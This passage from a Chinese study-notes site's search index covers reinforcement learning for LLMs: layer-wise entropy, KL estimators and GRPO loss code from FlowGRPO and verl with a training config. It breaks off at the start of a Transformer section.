Optimization","text":"<p>\u8fd9\u7bc7\u8bba\u6587\u901a\u8fc7\u5206\u6790LLM\u5185\u90e8\u6b8b\u5dee\u6d41\u7684\u71b5\u53d8\u5316\uff0c\u6765\u5206\u6790LLM\u7684\u63a8\u7406\u8fc7\u7a0b\uff0c\u5bf9\u4e8e\u4e00\u4e9b\u4e3b\u6d41\u5f00\u6e90\u6a21\u578b\u8fdb\u884c\u4e86\u5206\u6790\uff0c\u53d1\u73b0\u4e86Llama\u6a21\u578b\u5728\u5927\u91cf\u7684\u5c42\u91cc\u9762\u90fd\u4fdd\u6301\u8f83\u9ad8\u7684\u71b5\uff0c\u800c\u5728\u6700\u540e\u51e0\u5c42\u5feb\u901f\u6536\u655b\uff0c\u800cQwen\u7684\u6a21\u578b\u5219\u5927\u591a\u4fdd\u6301\u4e00\u4e2a\u6bd4\u8f83\u5e73\u7a33\u7684\u71b5\u4e0b\u964d\u6d41\u7a0b\u3002\u5728\u4eca\u5e74\u7684RL\u5b9e\u9a8c\u4e2d\u53d1\u73b0\u4e86Llama\u7cfb\u5217\u6a21\u578b\u5728\u505aRL\u7684\u65f6\u5019\u76f8\u5f53\u4e0d\u7a33\u5b9a\uff0c\u9700\u8981\u5927\u91cfSFT\u6570\u636e\u9884\u70ed\u624d\u53ef\u4ee5\u6b63\u5e38\u8fdb\u884cRL\uff0c\u8fd9\u7bc7\u8bba\u6587\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e2a\u65b0\u7684\u89c6\u89d2</p> <p></p> <p>\u9664\u4e86\u5bf9\u4e8e\u73b0\u5728\u5f00\u6e90\u6a21\u578b\u7684\u7814\u7a76\u4ee5\u5916\uff0c\u8fd9\u7bc7\u8bba\u6587\u8fd8\u8003\u8651\u80fd\u5426\u5bf9\u5355\u4e2a\u5c42\u7684\u8f93\u51fa\u7279\u6027\u505a\u4f18\u5316\uff0c\u63d0\u51fa\u4e86\u4e00\u79cd\u65b0\u7684\u4f18\u5316\u65b9\u6848\uff0c\u6bd4\u5982\u5bf9\u4e8eQwen\uff0c\u6211\u4eec\u53ef\u4ee5\u56fa\u5b9a\u540e\u7eed\u6536\u655b\u7684\u5c42\uff0c\u4ec5\u5bf9\u4e8e\u524d\u9762\u51e0\u5c42\u8fdb\u884c\u4f18\u5316\uff0c\u5bf9\u4e8eLlama\uff0c\u6211\u4eec\u53ea\u56fa\u5b9a\u6700\u540e\u51e0\u5c42\uff0c\u5bf9\u5176\u4ed6\u90e8\u5206\u8fdb\u884c\u4f18\u5316\uff0c\uff08\u8fd9\u91cc\u53ea\u4f18\u53160-L\u5c42\u548c\u6700\u540e\u7684\u89e3\u5d4c\u5165\u77e9\u9635\uff09\u53d1\u73b0\u8fd9\u79cd\u65b9\u6848\u7684RL\u53ef\u4ee5\u4f5c\u4e3a\u9884\u70ed\uff0c\u4f7f\u5f97Qwen\u7cfb\u5217\u548cLlama\u7cfb\u5217\u6a21\u578b\u90fd\u6709\u6548\u6da8\u70b9\uff0c\u5e76\u4e14\u7ef4\u6301Pass@k\u6027\u80fd</p> <p>\u672c\u8eab\u5728\u8ba1\u7b97\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4f7f\u7528\u7b2cK\u5c42\u7684\u8f93\u51falogits\u6765\u8ba1\u7b97importance ratio\uff0cReward\u8fd8\u662f\u6765\u81ea\u4e8e\u6574\u4e2a\u6a21\u578b\u7684\u8f93\u51fa\uff0c\u5e76\u4e14\u57fa\u4e8e\u8fd9\u4e2a\u7ed3\u679c\u8ba1\u7b97Loss\uff0c\u8fd9\u4e2aLoss\u81ea\u7136\u4f9d\u8d56\u4e8e\u524dK\u5c42\u7684\u68af\u5ea6\uff0c\u56e0\u6b64\u5728\u8ba1\u7b97\u56fe\u4e2d\u4e5f\u5c31\u53ea\u4f1a\u66f4\u65b0\u524dK\u5c42\uff0c\u5b9e\u73b0\u524dK\u5c42\u5355\u72ec\u7684\u4f18\u5316</p> <p>\u5173\u4e8eRL\u5bf9\u4e8e\u6a21\u578b\u5185\u90e8\u5c42\u4e4b\u95f4\u7684\u5f71\u54cd\uff0c\u8fd8\u6709\u4e00\u7bc7Google\u7684\u8bba\u6587\u4e5f\u5206\u6790\u4e86\u7c7b\u4f3c\u7684\u73b0\u8c61\uff0c\u8fd9\u7bc7\u8bba\u6587 \u63d0\u51fa\u4e86Hierarchical RL\u7684\u65b0\u65b9\u6cd5\uff0c\u540c\u6837\u662f\u7814\u7a76\u4e86\u5185\u90e8\u7684\u6b8b\u5dee\u6d41\uff0c\u5176\u4e2d\u6d8c\u73b0\u51fa\u6765\u7ebf\u6027\u53ef\u63a7\u7684\u65f6\u5e8f\u62bd\u8c61\uff0c\u7136\u540e\u5f97\u5230\u4e86\u4e00\u4e9b\u89c2\u5bdf</p> <ul> <li>\u4e2d\u95f4\u5c42\u6709\u6700\u4e30\u5bcc\u7684\u5b50\u76ee\u6807\u4fe1\u606f</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/LLM%20RL%20Theory/#2-kl-in-rl","title":"2. KL in RL","text":"<p>\u8fd9\u7bc7\u8bba\u6587\u63d0\u51fa\u4e86\u5728RL\u8bad\u7ec3\u4e2d\u7684KL\u5e94\u8be5\u91c7\u7528K1\u4f30\u8ba1\u5668\u800c\u4e0d\u662f\u73b0\u5728\u5e38\u7528\u7684K3\u4f30\u8ba1\u5668\uff0c\u5728RL\u4e2d\u4f7f\u7528KL\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u4e0d\u5e0c\u671b\u6a21\u578b\u504f\u79bb\u539f\u672c\u6a21\u578b\u7684\u5206\u5e03\u592a\u8fdc\uff0c\u9632\u6b62\u9020\u6210\u707e\u96be\u6027\u9057\u5fd8\u7b49\u95ee\u9898\u3002\u5bf9\u4e8eGRPO\u7b49\u7b97\u6cd5\uff0c\u6211\u4eec\u5176\u5b9e\u9700\u8981\u7684\u662fSequence\u7ea7\u522b\u7684KL\u8ba1\u7b97\uff0c\u5728\u5b9e\u9645\u64cd\u4f5c\u4e2d\u8868\u73b0\u4e3a\u5c06Token\u7ea7\u522b\u7684KL\u8fdb\u884c\u7d2f\u52a0</p> <p></p> <p>\u4e4b\u524d\u7684\u5b9e\u8df5\u662f\u91c7\u7528\u5c06K3\u4f30\u8ba1\u7eb3\u5165\u5230Loss\u8ba1\u7b97\u4e2d\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5f80\u5f80\u5c06RL\u4e2d\u7684Reward\u7b97\u4f5cLoss\u7684\u4e00\u90e8\u5206\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u662f\u5b58\u5728\u533a\u522b\u7684\uff0c\u6bd4\u5982\u5982\u679c\u6211\u4eec\u5c06KL\u9879\u653e\u5728Reward\u4e2d\u7684\u8bdd\uff0c\u5176\u88ab\u89c6\u4e3a\u6807\u91cf\u5956\u52b1\u7684\u4e00\u90e8\u5206\uff0c\u68af\u5ea6\u6765\u6e90\u4e8e\u5bf9\u4e8epolicy\u91c7\u6837\u7684\u6c42\u5bfc\uff1b\u800c\u5982\u679c\u5c06KL\u9879\u653e\u5728Loss\u4e2d\uff08\u73b0\u5728\u5e38\u7528\u7684\u65b9\u6848\uff09\uff0c\u73b0\u4ee3AutoGrad\u6846\u67b6\u4f1a\u8ba1\u7b97\u8def\u5f84\u5bfc\u6570\uff0c\u56e0\u6b64\u4e24\u8005\u5176\u5b9e\u5b58\u5728\u663e\u8457\u7684\u5dee\u5f02</p> <p></p> <p>\u6839\u636e\u5b9e\u9a8c\u8868\u73b0\uff0c\u5c06K1\u4f30\u8ba1\u7eb3\u5165\u5230Reward\u4e2d\uff0c\u6bd4\u5176\u4ed6\u4e09\u79cd\u65b9\u5f0f\u66f4\u63a5\u8fd1\u65e0\u635f\u7684\u65b9\u6848</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/RL%20Basic/","title":"RL Basic","text":"<p>\u8fd9\u662f\u5728\u51c6\u5907\u63a8\u514d\u7684\u65f6\u5019\u5f62\u6210\u7684RL\u7b14\u8bb0\uff0c\u6bd4\u8f83\u6df7\u4e71</p> <p>\u5df2\u77e5Bellman\u516c\u5f0f\u4e4b\u540e\uff0c\u5982\u4f55\u8fdb\u884cPolicy\u4f18\u5316\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86Bellman Equation\u662f\u5bf9\u4e8e\u4e00\u4e2aPolicy\u4e0b\u7684\u72b6\u6001\u7684\u4f18\u52bf\u516c\u5f0f</p> <p>\u6c42\u89e3bellman function\uff0c\u6211\u4eec\u77e5\u9053\u4e86state value\uff0c\u77e5\u9053state value\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97action value\uff0c\u77e5\u9053action value\u6211\u4eec\u5c31\u80fd\u627e\u5230\u66f4\u4f18\u7b56\u7565\uff0c\u7136\u66f4\u65b0\u4e00\u904d\u4e4b\u540e\u7ee7\u7eed\u8ba1\u7b97Bellman function\uff0c\u5982\u6b64\u5faa\u73af</p> <p>\u4f46\u662f\u5728\u4f18\u5316\u4e2d\u6709\u4e00\u4e2a\u8fc7\u7a0b</p> <ul> <li>\u4e00\u4e2a\u65b0\u7684\u7b56\u7565\uff0c\u662f\u5728\u6240\u6709state\u90fd\u8d85\u8fc7\u539f\u5148\u7b56\u7565\uff0c\u8fd8\u662f\u53ea\u5728\u90e8\u5206</li> <li>\u8fd9\u4e2a\u66f4\u4f18\u7b56\u7565\u552f\u4e00\u5417</li> <li>\u5982\u4f55\u53bb\u83b7\u53d6\u8fd9\u4e2a\u66f4\u4f18\u7b56\u7565</li> <li>\u4ec0\u4e48\u662fModel based\u548cModel free</li> <li>GAE\u662f\u4ec0\u4e48<ul> <li>GAE\u662f\u4e00\u79cd\u8bb2MC\u65b9\u6848\u548cTD\u65b9\u6848\u7ed3\u5408\u8d77\u6765\u7684\u505a\u6cd5\uff0c\u8fd9\u4e24\u4e2a\u65b9\u6848\u90fd\u662f\u4e3a\u4e86\u8ba1\u7b97Advantage</li> <li>MC\u65b9\u6848\u5373\u7528\u5b9e\u9645\u7684\u672a\u6765\u603b\u56de\u62a5\u51cf\u53bb\u5f53\u524d\u72b6\u6001\u4ef7\u503c</li> <li>TD\u65b9\u6848\u5373\u7528\u5373\u65f6\u5956\u52b1\u52a0\u4e0a\u4e0b\u4e00\u4e2a\u72b6\u6001\u7684\u4ef7\u503c\u51cf\u53bb\u5f53\u524d\u72b6\u6001\u4ef7\u503c</li> <li>GAE\u5c31\u662f\u8bb2\u4e24\u4e2a\u65b9\u6848\u52a0\u6743\uff0c\u5f15\u5165\u4e00\u4e2a\u8d85\u53c2\u6570</li> </ul> </li> <li>LLM+RL\u53ef\u4ee5\u770b\u770bSearch R1\u7684\u4ee3\u7801\uff0cDiffusion+RL\u5c31\u770bFlowGRPO</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/RL%20Basic/#1-verl","title":"1. Verl","text":"<ul> <li>https://zhuanlan.zhihu.com/p/27676081245</li> <li>\u6700\u9ad8\u63d0\u534720\u500d\u541e\u5410\u91cf\uff01\u8c46\u5305\u5927\u6a21\u578b\u56e2\u961f\u53d1\u5e03\u5168\u65b0 RLHF \u6846\u67b6\uff0c\u73b0\u5df2\u5f00\u6e90\uff01</li> <li>https://github.com/zhaochenyang20/Awesome-ML-SYS-Tutorial</li> <li>veRL\u4ee3\u7801\u9605\u8bfb-1.\u8bba\u6587\u539f\u7406 - SunStriKE - \u535a\u5ba2\u56ed</li> <li>https://github.com/Unakar/Logic-RL</li> <li>verl: Flexible and Scalable Reinforcement Learning Library for LLM Reasoning and Tool-Calling</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/RL%20Basic/#2","title":"2. \u7b97\u6cd5","text":"<ul> <li>FlowGPRO\u548cVerl\u90fd\u7528\u7684AdamW</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/RL%20Basic/#21-vision-grpo","title":"2.1. Vision GRPO","text":"<p>https://github.com/Unakar/Logic-RL</p> <p>\u4e24\u4e2a\u7248\u672cGRPO</p> <ul> <li>FLowGRPO</li> </ul> <p>\u5148\u662fRollout</p> <pre><code># ... \u5728 main \u51fd\u6570\u7684 epoch \u5faa\u73af\u5185 ...\n# \u4f7f\u7528\u4fee\u6539\u540e\u7684 pipeline \u8fdb\u884c\u91c7\u6837\nimages, latents, sde_latents, log_probs, kls = pipeline_with_logprob_perstep(\n    pipeline,\n    # ... \u5176\u4ed6\u53c2\u6570 ...\n)\n\n# ...\n\n# \u5c06\u91c7\u96c6\u5230\u7684\u4fe1\u606f\u5b58\u5165 samples \u5217\u8868\nsamples.append(\n    {\n        # ... \u5176\u4ed6\u5143\u6570\u636e ...\n        \"latents\": latents[\n            :, :-1\n        ],  # \u6bcf\u4e2a entry \u662f timestep t \u4e4b\u524d\u7684 latent (\u72b6\u6001 x_t)\n        \"next_latents\": sde_latents, # \u4e0b\u4e00\u6b65\u7684 latent (\u72b6\u6001 x_{t-1})\n        \"log_probs\": log_probs, # \u4ece x_t \u5230 x_{t-1} \u7684\u5bf9\u6570\u6982\u7387\n        \"rewards\": rewards, # \u5c1a\u672a\u8ba1\u7b97\u7684\u5956\u52b1 future \u5bf9\u8c61\n    }\n)\n</code></pre> <p>\u7136\u540e\u8fdb\u884cAdvantage\u8ba1\u7b97\uff0c\u5176\u4e2d\u7684Reward\u6765\u81ea\u4e8eBenchmark\uff0c\u5728\u8fd9\u91cc\u8ba1\u7b97Advantage\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u4e24\u79cd\u7b97\u5747\u503c\u7684\u65b9\u6848\uff0c\u5e94\u8be5\u4e00\u79cd\u662fflowGRPO\u7684\u4e00\u79cd\u662f\u6211\u4eec\u7528\u7684</p> <p></p> <p>\u968f\u540e\u8ba1\u7b97Loss\u7684\u8303\u5f0f\u548c\u6587\u672c\u7684\u662f\u4e00\u81f4\u7684\uff0c\u540c\u6837\u6709\u91cd\u8981\u6027\u91c7\u6837\uff0c\u5148\u53d6\u4e00\u904d\u8001\u7248\u672c\u7684\u6982\u7387</p> <pre><code># compute_log_prob \u51fd\u6570\u8ba1\u7b97\u5f53\u524d\u7b56\u7565\u7684\u5bf9\u6570\u6982\u7387\nprev_sample, log_prob, prev_sample_mean, std_dev_t = compute_log_prob(transformer, pipeline, sample, j, embeds, pooled_embeds, config)\n</code></pre> <p>\u7136\u540e\u8ba1\u7b97ratio</p> <pre><code># sample[\"log_probs\"][:, j] \u662f\u91c7\u6837\u65f6\u8bb0\u5f55\u7684\u65e7\u5bf9\u6570\u6982\u7387\nratio = torch.exp(log_prob - sample[\"log_probs\"][:, j])\n</code></pre> <p>\u7136\u540e\u662fClip Loss\u548cKL loss</p> <pre><code># advantages \u4e58\u4ee5 ratio\nunclipped_loss = - 2.25 * std_dev_t * advantages * ratio\n\n# advantages \u4e58\u4ee5\u88c1\u526a\u540e\u7684 ratio\nclipped_loss = - 2.25 * std_dev_t * advantages * torch.clamp(\n    ratio,\n    1.0 - config.train.clip_range,\n    1.0 + config.train.clip_range,\n)\n\n# \u53d6\u4e24\u8005\u4e2d\u7684\u6700\u5927\u503c\uff08\u56e0\u4e3a\u662f\u8d1f\u6570\uff0c\u6240\u4ee5\u662f\u60e9\u7f5a\u66f4\u5927\u7684\u90a3\u4e2a\uff09\npolicy_loss = torch.mean(torch.maximum(unclipped_loss, clipped_loss))\n\nif config.train.beta &gt; 0:\n    # ... \u8ba1\u7b97 KL loss ...\n    loss = policy_loss + config.train.beta * kl_loss\nelse:\n    loss = policy_loss\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/RL%20Basic/#22-search-gpro","title":"2.2. Search GPRO","text":"<p>\u6bcf\u4e2aPrompt\u751f\u62105\u4e2aresponse</p> <p>\u9996\u5148\u6211\u4eec\u4f1a\u83b7\u5f97\u65b0\u7684Policy\u7684log probability</p> <pre><code>                        with torch.no_grad():\n                            output = self.actor_rollout_wg.compute_log_prob(final_gen_batch_output)\n                            final_gen_batch_output = final_gen_batch_output.union(output)\n</code></pre> <p>\u5e76\u4e14\u6211\u4eec\u4f1a\u83b7\u5f97\u8001\u7684Policy\u7684log probability</p> <pre><code>                    if self.use_reference_policy:\n                        # compute reference log_prob\n                        with _timer('ref', timing_raw):\n                            ref_log_prob = self.ref_policy_wg.compute_ref_log_prob(batch)\n                            batch = batch.union(ref_log_prob)\n</code></pre> <p>GRPO \u7684 advantage \u8ba1\u7b97</p> <pre><code>def compute_grpo_outcome_advantage(token_level_rewards: torch.Tensor,\n                                   eos_mask: torch.Tensor,\n                                   index: torch.Tensor,\n                                   epsilon: float = 1e-6):\n    \"\"\"\n    Compute advantage for GRPO, operating only on Outcome reward \n    (with only one scalar reward for each response).\n    Args:\n        token_level_rewards: `(torch.Tensor)`\n            shape: (bs, response_length)\n        eos_mask: `(torch.Tensor)`\n            shape: (bs, response_length)\n\n    Returns:\n        advantages: `(torch.Tensor)`\n            shape: (bs, response_length)\n        Returns: `(torch.Tensor)`\n            shape: (bs, response_length)\n    \"\"\"\n    response_length = token_level_rewards.shape[-1]\n    non_zero_mask = (token_level_rewards != 0)\n    scores = (token_level_rewards * non_zero_mask).sum(dim=-1)\n\n    id2score = defaultdict(list)\n    id2mean = {}\n    id2std = {}\n\n    with torch.no_grad():\n        bsz = scores.shape[0]\n        for i in range(bsz):\n            id2score[index[i]].append(scores[i])\n        for idx in id2score:\n            if len(id2score[idx]) == 1:\n                id2mean[idx] = torch.tensor(0.0)\n                id2std[idx] = torch.tensor(1.0)\n            elif len(id2score[idx]) &gt; 1:\n                id2mean[idx] = torch.mean(torch.tensor(id2score[idx]))\n                id2std[idx] = torch.std(torch.tensor([id2score[idx]]))\n            else:\n                raise ValueError(f\"no score in prompt index: {idx}\")\n        for i in range(bsz):\n            scores[i] = (scores[i] - id2mean[index[i]]) / (id2std[index[i]] + epsilon)\n        scores = scores.unsqueeze(-1).tile([1, response_length]) * eos_mask\n\n    return scores, scores\n</code></pre> <p>\u968f\u540e\u5f15\u5165KL loss</p> <pre><code>                        if not self.config.actor_rollout_ref.actor.use_kl_loss:\n                            batch, kl_metrics = apply_kl_penalty(batch,\n                                                                 kl_ctrl=self.kl_ctrl,\n                                                                 kl_penalty=self.config.algorithm.kl_penalty)\n                            metrics.update(kl_metrics)\n                        else:\n                            batch.batch['token_level_rewards'] = batch.batch['token_level_scores']\n</code></pre> <p>\u7136\u540e\u8ba1\u7b97Policy Loss</p> <p>\u5728\u4e0b\u9762\u7684\u51fd\u6570\u4e2d\u8fd8\u5305\u62ec\u4e86\u91cd\u8981\u6027\u91c7\u6837\u7684\u90e8\u5206\uff0c\u6211\u4eec\u7684Policy Loss \u5982\u6b64\u7ed3\u7b97<code>pg_losses = -advantages * ratio</code>  \uff0cratio\u548cadvantage\u672c\u8d28\u90fd\u662f\u5411\u91cf\uff0c\u53ea\u662f\u5728\u6700\u540e\u4ed6\u4eec\u4f1a\u7b97\u5747\u503c\u5f62\u6210\u4e00\u4e2aLoss</p> <p>\u6211\u4eec\u8981\u628a\u73b0\u5728\u7684\u8f93\u51fa\u653e\u5230\u8001\u7684Policy\u4e2d\u8fdb\u884c\u4e00\u904d\u8ba1\u7b97\uff0c\u83b7\u5f97old policy probability</p> <p></p> <pre><code>def compute_policy_loss(old_log_prob, log_prob, advantages, eos_mask, cliprange):\n    \"\"\"Adapted from https://github.com/huggingface/trl/blob/main/trl/trainer/ppo_trainer.py#L1122\n\n    Args:\n        old_log_prob: `(torch.Tensor)`\n            shape: (bs, response_length)\n        log_prob: `(torch.Tensor)`\n            shape: (bs, response_length)\n        advantages: `(torch.Tensor)`\n            shape: (bs, response_length)\n        eos_mask: `(torch.Tensor)`\n            shape: (bs, response_length)\n        cliprange: (float)\n            The clip range used in PPO. See https://arxiv.org/abs/1707.06347\n\n    Returns:\n        pg_loss: `a scalar torch.Tensor`\n            policy gradient loss computed via PPO\n        pg_clipfrac: (float)\n            a float number indicating the fraction of policy gradient loss being clipped\n\n    \"\"\"\n    negative_approx_kl = log_prob - old_log_prob\n    ratio = torch.exp(negative_approx_kl)\n    ppo_kl = verl_F.masked_mean(-negative_approx_kl, eos_mask)\n\n    pg_losses = -advantages * ratio\n    pg_losses2 = -advantages * torch.clamp(ratio, 1.0 - cliprange, 1.0 + cliprange)\n\n    pg_loss = verl_F.masked_mean(torch.max(pg_losses, pg_losses2), eos_mask)\n    pg_clipfrac = verl_F.masked_mean(torch.gt(pg_losses2, pg_losses).float(), eos_mask)\n    return pg_loss, pg_clipfrac, ppo_kl\n</code></pre> <p>\u6700\u540e\u6574\u5408\u5404\u9879Loss</p> <ul> <li>Policy Loss \u4e3a\u4e86\u6700\u5927\u5316\u5956\u52b1\u800c\u5b58\u5728\u7684Loss\uff0c\u8fd9\u4e2aLoss\u6709\u4e09\u90e8\u5206\uff0c\u65b0\u65e7\u7b56\u7565\u7684\u6bd4\u4f8b\u4e58\u4ee5Advantage\uff0c\u518d\u7b97Clip</li> <li>Entropy Loss \u518dLoss\u4e2d\u51cf\u53bb\u71b5\u635f\u5931\uff0c\u5c31\u662f\u4e3a\u4e86\u9f13\u52b1\u9ad8\u71b5\u64cd\u4f5c\uff0c\u9f13\u52b1\u63a2\u7d22</li> <li>KL\u6563\u5ea6\uff0c\u548cSFT\u6a21\u578b\u7b97\u4e0d\u786e\u5b9a\u5ea6</li> </ul> <pre><code>                pg_loss, pg_clipfrac, ppo_kl = core_algos.compute_policy_loss(old_log_prob=old_log_prob,\n                                                                              log_prob=log_prob,\n                                                                              advantages=advantages,\n                                                                              eos_mask=response_mask,\n                                                                              cliprange=clip_ratio)\n                # compute entropy loss from entropy\n                entropy_loss = verl_F.masked_mean(entropy, response_mask)\n\n                # compute policy loss\n                policy_loss = pg_loss - entropy_loss * entropy_coeff\n\n                if self.config.use_kl_loss:\n                    ref_log_prob = data['ref_log_prob']\n                    # compute kl loss\n                    kld = core_algos.kl_penalty(logprob=log_prob,\n                                                ref_logprob=ref_log_prob,\n                                                kl_penalty=self.config.kl_loss_type)\n                    kl_loss = masked_mean(kld, response_mask)\n\n                    policy_loss = policy_loss + kl_loss * self.config.kl_loss_coef\n                    metrics['actor/kl_loss'] = kl_loss.detach().item()\n                    metrics['actor/kl_coef'] = self.config.kl_loss_coef\n\n                loss = policy_loss / self.gradient_accumulation\n                loss.backward()\n</code></pre> <p>\u90e8\u5206\u53c2\u6570\u914d\u7f6e\u5982\u4e0b</p> <pre><code>    algorithm.adv_estimator=grpo \\\n    actor_rollout_ref.model.path=$BASE_MODEL \\\n    actor_rollout_ref.model.enable_gradient_checkpointing=true \\\n    actor_rollout_ref.model.use_remove_padding=True \\\n    actor_rollout_ref.actor.optim.lr=1e-6 \\\n    actor_rollout_ref.actor.optim.lr_warmup_steps_ratio=0.285 \\\n    actor_rollout_ref.actor.use_kl_loss=true \\\n    actor_rollout_ref.actor.ppo_mini_batch_size=256 \\\n    actor_rollout_ref.actor.ppo_micro_batch_size=64 \\\n    actor_rollout_ref.actor.fsdp_config.param_offload=true \\\n    actor_rollout_ref.actor.fsdp_config.grad_offload=true \\\n    actor_rollout_ref.actor.fsdp_config.optimizer_offload=true \\\n    actor_rollout_ref.rollout.log_prob_micro_batch_size=128 \\\n    actor_rollout_ref.rollout.tensor_model_parallel_size=1 \\\n    actor_rollout_ref.rollout.name=vllm \\\n    actor_rollout_ref.rollout.gpu_memory_utilization=0.6 \\\n    actor_rollout_ref.ref.log_prob_micro_batch_size=128 \\\n    actor_rollout_ref.ref.fsdp_config.param_offload=True \\\n    actor_rollout_ref.actor.kl_loss_coef=0.001 \\\n    actor_rollout_ref.actor.kl_loss_type=low_var_kl \\\n    algorithm.no_think_rl=false \\\n    actor_rollout_ref.rollout.n_agent=5 \\\n    actor_rollout_ref.rollout.temperature=1 \\\n    actor_rollout_ref.actor.state_masking=true \\\n    trainer.logger=['wandb'] \\\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Self-attention%20And%20Transformer/Self-attention%20And%20Transformer/","title":"Self-attention And Transformer","text":"<p>\u5728\u6211\u4eec\u4e4b\u524d\u5b66\u4e60\u6df1\u5ea6\u5b66\u4e60\u7684\u65f6\u5019\u603b\u662f\u628a\u5404\u79cd\u5143\u7d20\u62bd\u8c61\u6210\u5411\u91cf\uff0c\u4f46\u662f\u6709\u4e9b\u5143\u7d20\u662f\u53ef\u4ee5\u6bd4\u8f83\u5bb9\u6613\u62bd\u8c61\u6210\u5411\u91cf\u7684\uff0c\u6bd4\u5982\u56fe\u7247\u4fe1\u606f\uff1b\u4f46\u662f\u5bf9\u4e8e\u4e00\u4e9b\u5176\u4ed6\u5143\u7d20\u5e76\u975e\u5982\u6b64\u76f4\u89c2\uff0c\u6bd4\u5982\u8bf4\u8bcd\u6c47\uff0c\u8bed\u97f3\u7b49\u7b49</p> <p>\u6bd4\u5982\u8bf4\u5bf9\u4e8e\u8bcd\u6c47\uff0c\u6211\u4eec\u6709Word Embedding\uff0c\u4e00\u79cd\u7ed9\u8bcd\u6c47\u5411\u91cf\u5316\u4f46\u662f\u53c8\u4e0d\u4e27\u5931\u5176\u8bed\u4e49\u7684\u65b9\u5f0f\uff0c\u5355\u7eaf\u7684\u7528Ascii\u5411\u91cf\u5316\u4f1a\u4e27\u5931\u4e0d\u5c11\u8bed\u4e49</p> <p>RNN\u7684\u51fa\u73b0\u4e3b\u8981\u662f\u4e3a\u4e86\u5904\u7406\u8bcd\u5e8f\u903b\u8f91\uff0c\u4e0e\u56fe\u50cf\u77e9\u9635\u4e0d\u540c\u7684\u662f\uff0c\u8bcd\u5e8f\u903b\u8f91\u662f\u6709\u987a\u5e8f\u5173\u7cfb\u7684\uff1b\u800cAttention\u7684\u673a\u5236\u4e3b\u8981\u662f\u7528\u4e8e\u89e3\u51b3RNN\u5728\u957f\u6587\u672c\u7b49\u60c5\u5f62\u9047\u5230\u7684\u74f6\u9888\u95ee\u9898</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Self-attention%20And%20Transformer/Self-attention%20And%20Transformer/#1-basic","title":"1. Basic","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Self-attention%20And%20Transformer/Self-attention%20And%20Transformer/#11-encoder-and-decoder","title":"1.1 \u7f16\u7801\u548c\u89e3\u7801 encoder and decoder","text":"<p>\u8fd9\u4e2a\u6982\u5ff5\u6700\u65e9\u51fa\u73b0\u4e8eRNN\uff0c\u672c\u8d28\u662f\u8981\u5c06\u8bed\u8a00\u8fd9\u79cd\u4e1c\u897f\u6570\u5b57\u5316\uff0c\u540c\u65f6\u4e0d\u662f\u53bb\u8bed\u4e49\u672c\u8eab\u7684\u8054\u7cfb\uff0c\u57fa\u7840\u7684\u7f16\u7801\u6709\u4e24\u79cd\u505a\u6cd5\uff0c\u8fd9\u4e24\u79cd\u505a\u6cd5\u6709\u5404\u81ea\u7684\u7f3a\u9677</p> <ul> <li>tokenizer</li> <li>one hot</li> </ul> <p>\u200b\u200b</p> <p>\u6240\u8c13\u7684\u7f16\u7801\u5c31\u662f\u6211\u4eec\u8981\u521b\u5efa\u4e00\u4e2a\u6f5c\u7a7a\u95f4\uff0c\u7136\u540e\u5c06\u4e00\u5806\u7684token\u6620\u5c04\u5230\u8fd9\u4e2a\u7a7a\u95f4\u4e2d\uff0c\u6210\u4e3a\u4e00\u4e2a\u4e2a\u5411\u91cf\uff0c\u5177\u4f53\u7684\u4f8b\u5b50\u53ef\u80fd\u662f\u8fd9\u6837\u7684</p> <p>\u200b\u200b</p> <p>\u7f16\u7801\u7684\u8fc7\u7a0b\u5c31\u662f\u8981\u8bad\u7ec3\u8fd9\u6837\u4e00\u4e2a\u6f5c\u7a7a\u95f4\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u62bd\u8c61\u8bed\u8a00\u7684\u8bed\u4e49\uff0c\u5f53\u7136\u7f16\u7801\u7cfb\u7edf\u5e76\u4e0d\u6b62\u6b65\u4e8eNLP\uff0c\u56fe\u50cf\u4fe1\u606f\u540c\u6837\u53ef\u4ee5\u505aimage embedding</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Self-attention%20And%20Transformer/Self-attention%20And%20Transformer/#12","title":"1.2 